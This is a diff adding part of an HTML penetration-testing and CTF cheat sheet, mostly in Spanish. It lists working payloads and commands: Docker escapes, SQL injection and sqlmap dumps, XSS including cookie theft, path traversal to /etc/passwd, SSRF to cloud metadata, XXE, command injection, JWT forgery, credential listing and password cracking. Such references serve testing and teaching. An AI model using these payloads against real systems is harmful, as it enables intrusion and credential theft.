+        <div class="cmd-item"><span class="cmd-code">cat /proc/1/cgroup | grep docker</span><span class="cmd-comment">detectar container</span></div>
+        <div class="cmd-item"><span class="cmd-code">ls /.dockerenv</span><span class="cmd-comment">dockerenv file</span></div>
+        <div class="cmd-item"><span class="cmd-code">id | grep docker</span><span class="cmd-comment">grupo docker</span></div>
+        <div class="cmd-item"><span class="cmd-code">docker run -it -v /:/mnt alpine chroot /mnt sh</span><span class="cmd-comment">docker escape (si grupo docker)</span></div>
+        <div class="cmd-item"><span class="cmd-code">docker run --privileged -it ubuntu bash</span><span class="cmd-comment">privileged container</span></div>
+        <div class="cmd-item"><span class="cmd-code">nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</span><span class="cmd-comment">nsenter escape</span></div>
+        <div class="cmd-item"><span class="cmd-code">capsh --print | grep Current</span><span class="cmd-comment">caps en container</span></div>
+        <div class="cmd-item"><span class="cmd-code">mount | grep "/ type"</span><span class="cmd-comment">mounts</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     WEB ATTACKS (referencia / detección)
+═══════════════════════════════════════════ -->
+<section id="web">
+  <div class="section-header"><h2>// web testing</h2><span class="section-tag tag-r">SQLi · XSS · LFI · SSRF · auth</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">SQLi — patrones de prueba</span><span class="cmd-card-desc">injection testing</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">' OR '1'='1</span><span class="cmd-comment">classic bypass</span></div>
+        <div class="cmd-item"><span class="cmd-code">' OR 1=1 --</span><span class="cmd-comment">MySQL comment</span></div>
+        <div class="cmd-item"><span class="cmd-code">' UNION SELECT null,null,null --</span><span class="cmd-comment">UNION columns</span></div>
+        <div class="cmd-item"><span class="cmd-code">' UNION SELECT table_name,2,3 FROM information_schema.tables --</span><span class="cmd-comment">enum tables</span></div>
+        <div class="cmd-item"><span class="cmd-code">' AND SLEEP(5) --</span><span class="cmd-comment">time-based blind</span></div>
+        <div class="cmd-item"><span class="cmd-code">' AND 1=2 UNION SELECT user(),version(),database() --</span><span class="cmd-comment">MySQL info</span></div>
+        <div class="cmd-item"><span class="cmd-code">sqlmap -u "http://t?id=1" --dbs</span><span class="cmd-comment">sqlmap databases</span></div>
+        <div class="cmd-item"><span class="cmd-code">sqlmap -u "http://t?id=1" -D db -T users --dump</span><span class="cmd-comment">sqlmap dump</span></div>
+        <div class="cmd-item"><span class="cmd-code">sqlmap -u "http://t?id=1" --batch --risk=3 --level=5</span><span class="cmd-comment">sqlmap agresivo</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">XSS — patrones de prueba</span><span class="cmd-card-desc">cross-site scripting</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="cmd-comment">basic</span></div>
+        <div class="cmd-item"><span class="cmd-code">&lt;img src=x onerror=alert(1)&gt;</span><span class="cmd-comment">img tag</span></div>
+        <div class="cmd-item"><span class="cmd-code">&lt;svg onload=alert(1)&gt;</span><span class="cmd-comment">svg tag</span></div>
+        <div class="cmd-item"><span class="cmd-code">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><span class="cmd-comment">cookie steal (PoC)</span></div>
+        <div class="cmd-item"><span class="cmd-code">javascript:alert(1)</span><span class="cmd-comment">href bypass</span></div>
+        <div class="cmd-item"><span class="cmd-code">&lt;body onload=alert(1)&gt;</span><span class="cmd-comment">body event</span></div>
+        <div class="cmd-item"><span class="cmd-code">&lt;details open ontoggle=alert(1)&gt;</span><span class="cmd-comment">details tag</span></div>
+        <div class="cmd-item"><span class="cmd-code">%3Cscript%3Ealert(1)%3C/script%3E</span><span class="cmd-comment">URL encoded</span></div>
+        <div class="cmd-item"><span class="cmd-code">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span><span class="cmd-comment">HTML encoded</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">LFI / Path Traversal</span><span class="cmd-card-desc">file inclusion</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">?file=../../../../etc/passwd</span><span class="cmd-comment">path traversal</span></div>
+        <div class="cmd-item"><span class="cmd-code">?file=....//....//etc/passwd</span><span class="cmd-comment">bypass filter</span></div>
+        <div class="cmd-item"><span class="cmd-code">?file=php://filter/convert.base64-encode/resource=index.php</span><span class="cmd-comment">leer PHP source</span></div>
+        <div class="cmd-item"><span class="cmd-code">?file=/proc/self/environ</span><span class="cmd-comment">environ vars</span></div>
+        <div class="cmd-item"><span class="cmd-code">?file=/var/log/apache2/access.log</span><span class="cmd-comment">log poisoning (detección)</span></div>
+        <div class="cmd-item"><span class="cmd-code">?file=/proc/self/fd/10</span><span class="cmd-comment">file descriptor</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">SSRF · XXE · SSTI — detección</span><span class="cmd-card-desc">server-side issues</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">http://localhost/admin</span><span class="cmd-comment">SSRF localhost</span></div>
+        <div class="cmd-item"><span class="cmd-code">http://169.254.169.254/latest/meta-data/</span><span class="cmd-comment">AWS metadata</span></div>
+        <div class="cmd-item"><span class="cmd-code">file:///etc/passwd</span><span class="cmd-comment">SSRF file://</span></div>
+        <div class="cmd-item"><span class="cmd-code">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><span class="cmd-comment">XXE file read</span></div>
+        <div class="cmd-item"><span class="cmd-code">{{7*7}} ${7*7} #{7*7}</span><span class="cmd-comment">SSTI detection</span></div>
+        <div class="cmd-item"><span class="cmd-code">{{config.__class__.__init__.__globals__}}</span><span class="cmd-comment">Jinja2 SSTI detect</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">command injection — detección</span><span class="cmd-card-desc">code execution</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">; id</span><span class="cmd-comment">semicolon separator</span></div>
+        <div class="cmd-item"><span class="cmd-code">| id</span><span class="cmd-comment">pipe</span></div>
+        <div class="cmd-item"><span class="cmd-code">&amp;&amp; id</span><span class="cmd-comment">AND exec</span></div>
+        <div class="cmd-item"><span class="cmd-code">`id`</span><span class="cmd-comment">backtick</span></div>
+        <div class="cmd-item"><span class="cmd-code">$(id)</span><span class="cmd-comment">subshell</span></div>
+        <div class="cmd-item"><span class="cmd-code">sleep 5</span><span class="cmd-comment">time-based blind</span></div>
+        <div class="cmd-item"><span class="cmd-code">ping -c1 LHOST</span><span class="cmd-comment">detect OOB</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">auth bypass &amp; JWT</span><span class="cmd-card-desc">authentication issues</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">admin' --</span><span class="cmd-comment">SQLi login bypass</span></div>
+        <div class="cmd-item"><span class="cmd-code">{"alg":"none"}</span><span class="cmd-comment">JWT alg:none</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -a 0 -m 16500 jwt.txt wl</span><span class="cmd-comment">crackear JWT HS256</span></div>
+        <div class="cmd-item"><span class="cmd-code">X-Forwarded-For: 127.0.0.1</span><span class="cmd-comment">IP bypass header</span></div>
+        <div class="cmd-item"><span class="cmd-code">X-Original-IP: 127.0.0.1</span><span class="cmd-comment">IP bypass alt</span></div>
+        <div class="cmd-item"><span class="cmd-code">X-HTTP-Method-Override: DELETE</span><span class="cmd-comment">method override</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     WINDOWS / AD ENUMERATION
+═══════════════════════════════════════════ -->
+<section id="windows">
+  <div class="section-header"><h2>// windows &amp; active directory</h2><span class="section-tag tag-c">enum · powershell · networking</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">windows enum</span><span class="cmd-card-desc">reconocimiento</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">whoami /all</span><span class="cmd-comment">usuario + grupos + privs</span></div>
+        <div class="cmd-item"><span class="cmd-code">net user</span><span class="cmd-comment">listar usuarios</span></div>
+        <div class="cmd-item"><span class="cmd-code">net localgroup administrators</span><span class="cmd-comment">admins locales</span></div>
+        <div class="cmd-item"><span class="cmd-code">ipconfig /all</span><span class="cmd-comment">red completa</span></div>
+        <div class="cmd-item"><span class="cmd-code">netstat -ano</span><span class="cmd-comment">conexiones activas</span></div>
+        <div class="cmd-item"><span class="cmd-code">tasklist /svc</span><span class="cmd-comment">procesos + servicios</span></div>
+        <div class="cmd-item"><span class="cmd-code">systeminfo</span><span class="cmd-comment">info sistema</span></div>
+        <div class="cmd-item"><span class="cmd-code">wmic qfe list brief</span><span class="cmd-comment">patches instalados</span></div>
+        <div class="cmd-item"><span class="cmd-code">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><span class="cmd-comment">software instalado</span></div>
+        <div class="cmd-item"><span class="cmd-code">cmdkey /list</span><span class="cmd-comment">credenciales guardadas</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-WinEvent -LogName Security -MaxEvents 20</span><span class="cmd-comment">event log seguridad</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-ADUser -Filter * -Properties *</span><span class="cmd-comment">usuarios AD (RSAT)</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">powershell útil</span><span class="cmd-card-desc">PS administración</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">powershell -ep bypass</span><span class="cmd-comment">bypass exec policy</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-LocalUser | Select Name,Enabled</span><span class="cmd-comment">usuarios locales</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-Process | Sort CPU -Desc | Select -First 10</span><span class="cmd-comment">top procesos por CPU</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-Service | Where {$_.Status -eq "Running"}</span><span class="cmd-comment">servicios activos</span></div>
+        <div class="cmd-item"><span class="cmd-code">[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64"))</span><span class="cmd-comment">decode b64 en PS</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-ChildItem -Recurse -Filter *.config</span><span class="cmd-comment">buscar ficheros config</span></div>
+        <div class="cmd-item"><span class="cmd-code">Test-NetConnection -ComputerName host -Port 443</span><span class="cmd-comment">test conectividad</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-NetTCPConnection -State Listen</span><span class="cmd-comment">puertos en escucha</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-EventLog -LogName Application -Newest 50</span><span class="cmd-comment">logs aplicación</span></div>
+        <div class="cmd-item"><span class="cmd-code">Get-ScheduledTask | Where State -eq Running</span><span class="cmd-comment">tareas programadas</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     CTF TOOLS INTERACTIVOS
+═══════════════════════════════════════════ -->
+<section id="ctf">
+  <div class="section-header"><h2>// ctf tools</h2><span class="section-tag tag-p">interactive · encoders · decoders</span></div>
+  <div class="tools-grid">
+
+    <!-- BASE64 -->
+    <div class="tool-panel">
+      <h3>Base64 <span>encode / decode</span></h3>
+      <textarea id="b64-in" placeholder="Texto o Base64..."></textarea>
+      <div class="tool-row">
+        <button class="tbtn" onclick="b64enc()">Encode</button>
+        <button class="tbtn c" onclick="b64dec()">Decode</button>
+        <button class="tbtn c" onclick="b64url_enc()">URL-safe Enc</button>
+        <button class="tbtn c" onclick="b64url_dec()">URL-safe Dec</button>
+      </div>
+      <div class="out dim" id="b64-out">resultado</div>
+    </div>
+
+    <!-- ROT -->
+    <div class="tool-panel">
+      <h3>Caesar / ROT <span>todas las rotaciones</span></h3>
+      <textarea id="rot-in" placeholder="Texto cifrado..."></textarea>
+      <div class="tool-row">
+        <label style="font-size:11px;color:var(--text-muted);align-self:center">Shift:</label>
+        <input type="number" id="rot-n" value="13" style="width:65px;text-align:center" min="1" max="25">
+        <button class="tbtn" onclick="rotEnc()">Encode</button>
+        <button class="tbtn c" onclick="rotDec()">Decode</button>
+        <button class="tbtn g" onclick="rotBrute()">Brute 1-25</button>
+      </div>
+      <div class="out dim" id="rot-out">resultado</div>
+    </div>
+
+    <!-- HEX -->
+    <div class="tool-panel">
+      <h3>Hex <span>encode / decode / XOR</span></h3>
+      <textarea id="hex-in" placeholder="Texto o hex (48 65 6c 6c 6f)..."></textarea>
+      <div class="tool-row">
+        <button class="tbtn" onclick="hexEnc()">→ Hex</button>
+        <button class="tbtn c" onclick="hexDec()">Hex →</button>
+        <button class="tbtn c" onclick="hexXor()">XOR brute</button>
+        <button class="tbtn g" onclick="hexToInt()">Hex → Int</button>
+      </div>
+      <div class="out dim" id="hex-out">resultado</div>
+    </div>
+
+    <!-- URL/HTML -->
+    <div class="tool-panel">
+      <h3>URL / HTML / Unicode <span>encoding</span></h3>
+      <textarea id="url-in" placeholder="URL o texto..."></textarea>
+      <div class="tool-row">
+        <button class="tbtn" onclick="urlEnc()">URL Enc</button>
+        <button class="tbtn c" onclick="urlDec()">URL Dec</button>
+        <button class="tbtn" onclick="htmlEnc()">HTML Enc</button>
+        <button class="tbtn c" onclick="htmlDec()">HTML Dec</button>
+        <button class="tbtn g" onclick="unicodePts()">→ \uXXXX</button>
+      </div>
+      <div class="out dim" id="url-out">resultado</div>
+    </div>
+
+    <!-- HASH -->
+    <div class="tool-panel">
+      <h3>Hash <span>identify + generate</span></h3>
+      <textarea id="hash-in" placeholder="Hash para identificar, o texto para generar..." style="min-height:48px"></textarea>
+      <div class="tool-row">
+        <button class="tbtn c" onclick="identHash()">Identify</button>
+        <button class="tbtn" onclick="generateHashes()">Generate SHA-1/256/512</button>
+      </div>
+      <div class="hash-grid" id="hash-out" style="display:none"></div>
+    </div>
+
+    <!-- BINARY / MORSE -->
+    <div class="tool-panel">
+      <h3>Binary / Octal / Morse <span>converter</span></h3>
+      <textarea id="bin-in" placeholder="01001000 01101001 o texto o .- -- . ..."></textarea>
+      <div class="tool-row">
+        <button class="tbtn c" onclick="binDec()">Bin→Txt</button>
+        <button class="tbtn" onclick="textBin()">Txt→Bin</button>
+        <button class="tbtn c" onclick="octDec()">Oct→Txt</button>
+        <button class="tbtn" onclick="morseEnc()">→Morse</button>
+        <button class="tbtn c" onclick="morseDec()">Morse→</button>
+      </div>
+      <div class="out dim" id="bin-out">resultado</div>
+    </div>
+
+    <!-- NUMBER BASES -->
+    <div class="tool-panel">
+      <h3>Conversión de bases <span>2 / 8 / 10 / 16</span></h3>
+      <div class="tool-row">
+        <input type="text" id="base-in" placeholder="Valor..." style="flex:1">
+        <select id="base-from" style="width:90px">
+          <option value="10">Dec (10)</option>
+          <option value="2">Bin (2)</option>
+          <option value="8">Oct (8)</option>
+          <option value="16">Hex (16)</option>
+        </select>
+      </div>
+      <div class="tool-row">
+        <button class="tbtn" onclick="convertBases()">Convertir</button>
+      </div>
+      <div class="out dim" id="base-out">resultado</div>
+    </div>
+
+    <!-- JWT DECODER -->
+    <div class="tool-panel">
+      <h3>JWT Decoder <span>header · payload · forge</span></h3>
+      <textarea id="jwt-in" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
+      <div class="tool-row">
+        <button class="tbtn" onclick="jwtDecode()">Decode</button>
+        <button class="tbtn c" onclick="jwtNoneAlg()">Forge none-alg</button>
+      </div>
+      <div class="out dim" id="jwt-out">resultado</div>
+    </div>
+
+    <!-- CIPHER TOOLS -->
+    <div class="tool-panel">
+      <h3>Cifrados clásicos <span>atbash · vigenère</span></h3>
+      <div class="tabs">
+        <button class="tab active" onclick="switchCipher(this,'atbash')">Atbash</button>
+        <button class="tab" onclick="switchCipher(this,'vigenere')">Vigenère</button>
+      </div>
+      <textarea id="cipher-in" placeholder="Texto..."></textarea>
+      <div id="cipher-atbash" class="tab-content active">
+        <div class="tool-row">
+          <button class="tbtn" onclick="atbash()">Cifrar / Descifrar</button>
+        </div>
+      </div>
+      <div id="cipher-vigenere" class="tab-content">
+        <div class="tool-row">
+          <input type="text" id="vig-key" placeholder="Clave (ej: SECRET)" style="width:160px">
+          <button class="tbtn" onclick="vigEnc()">Enc</button>
+          <button class="tbtn c" onclick="vigDec()">Dec</button>
+        </div>
+      </div>
+      <div class="out dim" id="cipher-out">resultado</div>
+    </div>
+
+    <!-- ENCODER CHAINING -->
+    <div class="tool-panel">
+      <h3>Encoder chain <span>multiple rounds — estilo CyberChef</span></h3>
+      <textarea id="chain-in" placeholder="Texto de entrada..."></textarea>
+      <div class="tool-row" style="flex-wrap:wrap">
+        <select id="chain-op1"><option value="b64e">B64 enc</option><option value="b64d">B64 dec</option><option value="url">URL enc</option><option value="urld">URL dec</option><option value="hex">→ Hex</option><option value="hexd">Hex →</option><option value="rev">Reverse</option><option value="upper">Uppercase</option><option value="lower">Lowercase</option></select>
+        <select id="chain-op2"><option value="">— op 2 —</option><option value="b64e">B64 enc</option><option value="b64d">B64 dec</option><option value="url">URL enc</option><option value="urld">URL dec</option><option value="hex">→ Hex</option><option value="hexd">Hex →</option><option value="rev">Reverse</option></select>
+        <select id="chain-op3"><option value="">— op 3 —</option><option value="b64e">B64 enc</option><option value="b64d">B64 dec</option><option value="url">URL enc</option><option value="urld">URL dec</option><option value="hex">→ Hex</option><option value="rev">Reverse</option></select>
+        <button class="tbtn" onclick="runChain()">Run chain</button>
+      </div>
+      <div class="out dim" id="chain-out">resultado</div>
+    </div>
+
+  </div>
+
+  <div style="margin-top:1.2rem">
+    <div class="tip g"><span class="tip-text">Magic bytes: <code>PNG</code>=89504E47 · <code>JPG</code>=FFD8FFE0 · <code>GIF</code>=47494638 · <code>PDF</code>=25504446 · <code>ZIP</code>=504B0304 · <code>ELF</code>=7F454C46 · <code>PE</code>=4D5A9000</span></div>
+    <div class="tip p"><span class="tip-text">Stego rápido: <code>strings -n 8 file</code> · <code>binwalk -e file</code> · <code>foremost file</code> · <code>exiftool file</code> · <code>zsteg img.png</code> · <code>steghide extract -sf file</code></span></div>
+    <div class="tip"><span class="tip-text">CTF quick-wins: <code>file *</code> · <code>xxd f | head</code> · <code>grep -r "HTB{" .</code> · <code>grep -r "flag{" .</code> · <code>grep -rP "CTF\{" .</code></span></div>
+  </div>
+</section>
+<!-- ═══════════════════════════════════════════
+     CRYPTO
+═══════════════════════════════════════════ -->
+<section id="crypto">
+  <div class="section-header"><h2>// crypto &amp; hashing</h2><span class="section-tag tag-a">openssl · hashcat · john</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">openssl</span><span class="cmd-card-desc">crypto swiss knife</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">openssl s_client -connect RHOST:443</span><span class="cmd-comment">SSL info</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl x509 -in cert.pem -text -noout</span><span class="cmd-comment">leer cert</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl genrsa -out key.pem 4096</span><span class="cmd-comment">RSA key</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl rsa -in key.pem -pubout</span><span class="cmd-comment">extraer clave pública</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl enc -aes-256-cbc -pbkdf2 -in f -out f.enc</span><span class="cmd-comment">cifrar AES</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl enc -d -aes-256-cbc -pbkdf2 -in f.enc</span><span class="cmd-comment">descifrar AES</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl dgst -sha256 -hmac KEY file</span><span class="cmd-comment">HMAC-SHA256</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl passwd -6 password</span><span class="cmd-comment">SHA512crypt</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl pkcs12 -in cert.pfx -out cert.pem -nodes</span><span class="cmd-comment">PFX a PEM</span></div>
+        <div class="cmd-item"><span class="cmd-code">openssl ciphers -v | grep AES256</span><span class="cmd-comment">listar cifrados</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">hashcat</span><span class="cmd-card-desc">password cracking</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 0 hash.txt wl</span><span class="cmd-comment">MD5 diccionario</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 100 hash.txt wl</span><span class="cmd-comment">SHA1</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 1000 hash.txt wl</span><span class="cmd-comment">NTLM</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 1800 hash.txt wl</span><span class="cmd-comment">sha512crypt ($6$)</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 3200 hash.txt wl</span><span class="cmd-comment">bcrypt ($2y$)</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 0 -a 3 hash "?u?l?l?l?d?d"</span><span class="cmd-comment">mask attack</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 0 -r rules/best64.rule h wl</span><span class="cmd-comment">rules</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat -m 0 -a 1 h wl1 wl2</span><span class="cmd-comment">combinator</span></div>
+        <div class="cmd-item"><span class="cmd-code">hashcat --show hash.txt</span><span class="cmd-comment">ver crackeados</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">john the ripper</span><span class="cmd-card-desc">JtR</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">john hash.txt --wordlist=wl</span><span class="cmd-comment">diccionario</span></div>
+        <div class="cmd-item"><span class="cmd-code">john hash.txt --format=sha512crypt</span><span class="cmd-comment">forzar formato</span></div>
+        <div class="cmd-item"><span class="cmd-code">john hash.txt --incremental</span><span class="cmd-comment">modo incremental</span></div>
+        <div class="cmd-item"><span class="cmd-code">john hash.txt --rules --wordlist=wl</span><span class="cmd-comment">con reglas</span></div>
+        <div class="cmd-item"><span class="cmd-code">john --show hash.txt</span><span class="cmd-comment">mostrar crackeados</span></div>
+        <div class="cmd-item"><span class="cmd-code">unshadow /etc/passwd /etc/shadow > combined.txt</span><span class="cmd-comment">unshadow</span></div>
+        <div class="cmd-item"><span class="cmd-code">zip2john zip.zip > zip.hash</span><span class="cmd-comment">zip hash</span></div>
+        <div class="cmd-item"><span class="cmd-code">pdf2john file.pdf > pdf.hash</span><span class="cmd-comment">PDF hash</span></div>
+        <div class="cmd-item"><span class="cmd-code">ssh2john id_rsa > ssh.hash</span><span class="cmd-comment">SSH key hash</span></div>
+        <div class="cmd-item"><span class="cmd-code">keepass2john db.kdbx > kp.hash</span><span class="cmd-comment">KeePass hash</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">tipos de hash</span><span class="cmd-card-desc">identificación rápida</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">d41d8cd98f00b204e9800998ecf8427e</span><span class="cmd-comment">MD5 (32) -m 0</span></div>
+        <div class="cmd-item"><span class="cmd-code">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><span class="cmd-comment">SHA1 (40) -m 100</span></div>
+        <div class="cmd-item"><span class="cmd-code">e3b0c44298fc1c149afb...27ae41e4649b934ca</span><span class="cmd-comment">SHA256 (64) -m 1400</span></div>
+        <div class="cmd-item"><span class="cmd-code">cf83e1357eefb8bdf1542850...1079c3b</span><span class="cmd-comment">SHA512 (128) -m 1700</span></div>
+        <div class="cmd-item"><span class="cmd-code">$1$salt$hash</span><span class="cmd-comment">MD5crypt -m 500</span></div>
+        <div class="cmd-item"><span class="cmd-code">$5$salt$hash</span><span class="cmd-comment">SHA256crypt -m 7400</span></div>
+        <div class="cmd-item"><span class="cmd-code">$6$salt$hash</span><span class="cmd-comment">SHA512crypt -m 1800</span></div>
+        <div class="cmd-item"><span class="cmd-code">$2y$10$hash</span><span class="cmd-comment">bcrypt -m 3200</span></div>
+        <div class="cmd-item"><span class="cmd-code">aad3b435b51404eeaad3b435b51404ee</span><span class="cmd-comment">NTLM vacío -m 1000</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     FORENSICS
+═══════════════════════════════════════════ -->
+<section id="forensics">
+  <div class="section-header"><h2>// forensics &amp; stego</h2><span class="section-tag tag-c">volatility · binwalk · wireshark · disk</span></div>
+  <div class="cards-grid">
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">volatility 3</span><span class="cmd-card-desc">memory forensics</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.info</span><span class="cmd-comment">info básica</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.pslist</span><span class="cmd-comment">lista procesos</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.pstree</span><span class="cmd-comment">árbol procesos</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.cmdline</span><span class="cmd-comment">command lines</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.netscan</span><span class="cmd-comment">conexiones red</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.filescan</span><span class="cmd-comment">ficheros en mem</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.dumpfiles --pid 1234</span><span class="cmd-comment">dump ficheros</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.malfind</span><span class="cmd-comment">código inyectado</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw linux.bash</span><span class="cmd-comment">bash history</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.registry.hivelist</span><span class="cmd-comment">registry hives</span></div>
+        <div class="cmd-item"><span class="cmd-code">vol -f mem.raw windows.clipboard</span><span class="cmd-comment">clipboard</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">binwalk · foremost · steghide</span><span class="cmd-card-desc">file analysis</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">binwalk -e file</span><span class="cmd-comment">extraer embebidos</span></div>
+        <div class="cmd-item"><span class="cmd-code">binwalk -Me file</span><span class="cmd-comment">extract recursivo</span></div>
+        <div class="cmd-item"><span class="cmd-code">binwalk -A file</span><span class="cmd-comment">buscar código</span></div>
+        <div class="cmd-item"><span class="cmd-code">foremost -i file -o /tmp/out</span><span class="cmd-comment">foremost</span></div>
+        <div class="cmd-item"><span class="cmd-code">steghide extract -sf file.jpg</span><span class="cmd-comment">extraer stego</span></div>
+        <div class="cmd-item"><span class="cmd-code">steghide info file.jpg</span><span class="cmd-comment">info stego</span></div>
+        <div class="cmd-item"><span class="cmd-code">zsteg -a file.png</span><span class="cmd-comment">LSB stego PNG</span></div>
+        <div class="cmd-item"><span class="cmd-code">exiftool file</span><span class="cmd-comment">metadata EXIF</span></div>
+        <div class="cmd-item"><span class="cmd-code">pngcheck -v file.png</span><span class="cmd-comment">validar PNG</span></div>
+        <div class="cmd-item"><span class="cmd-code">identify -verbose file.jpg</span><span class="cmd-comment">ImageMagick info</span></div>
+        <div class="cmd-item"><span class="cmd-code">file *; xxd file | head -3</span><span class="cmd-comment">identificar fichero</span></div>
+        <div class="cmd-item"><span class="cmd-code">stegdetect file.jpg</span><span class="cmd-comment">detectar stego</span></div>
+      </div>
+    </div>
+
+    <div class="cmd-card">
+      <div class="cmd-card-header"><span class="cmd-card-title">wireshark / tshark</span><span class="cmd-card-desc">traffic analysis</span></div>
+      <div class="cmd-list">
+        <div class="cmd-item"><span class="cmd-code">tshark -r file.pcap</span><span class="cmd-comment">leer pcap</span></div>
+        <div class="cmd-item"><span class="cmd-code">tshark -r file.pcap -Y "http"</span><span class="cmd-comment">filtro HTTP</span></div>
+        <div class="cmd-item"><span class="cmd-code">tshark -r file.pcap -Y "tcp.port==443"</span><span class="cmd-comment">filtro puerto</span></div>
+        <div class="cmd-item"><span class="cmd-code">tshark -r file.pcap -T fields -e http.request.uri</span><span class="cmd-comment">extraer URIs</span></div>
+        <div class="cmd-item"><span class="cmd-code">tshark -r file.pcap -T fields -e data | xxd</span><span class="cmd-comment">extraer datos raw</span></div>
+        <div class="cmd-item"><span class="cmd-code">tshark -r f.pcap -qz io,stat,1</span><span class="cmd-comment">estadísticas</span></div>
+        <div class="cmd-item"><span class="cmd-code">tshark -r f.pcap -z "follow,tcp,ascii,0"</span><span class="cmd-comment">follow TCP stream</span></div>
+        <div class="cmd-item"><span class="cmd-code">tcpdump -i eth0 -w capture.pcap</span><span class="cmd-comment">capturar tráfico</span></div>
+        <div class="cmd-item"><span class="cmd-code">tcpdump -r file.pcap 'tcp port 80'</span><span class="cmd-comment">filtro tcpdump</span></div>
+        <div class="cmd-item"><span class="cmd-code">tcpdump -i eth0 'not port 22'</span><span class="cmd-comment">excluir SSH</span></div>
+      </div>
+    </div>
+
